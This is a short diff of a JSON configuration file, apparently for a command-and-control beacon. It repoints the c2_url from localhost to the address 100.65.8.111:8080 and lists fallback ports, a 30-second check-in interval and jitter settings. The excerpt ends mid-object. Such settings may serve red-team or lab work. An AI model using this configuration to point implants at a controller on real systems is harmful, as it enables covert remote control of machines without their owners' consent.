@@ -1,5 +1,5 @@
 {
-    "c2_url": "http://127.0.0.1:8080",
+    "c2_url": "http://100.65.8.111:8080",
     "fallback_ports": [8080, 8000, 8443, 9090, 443, 80],
     "check_in_interval": 30,
     "jitter_percent": 30,
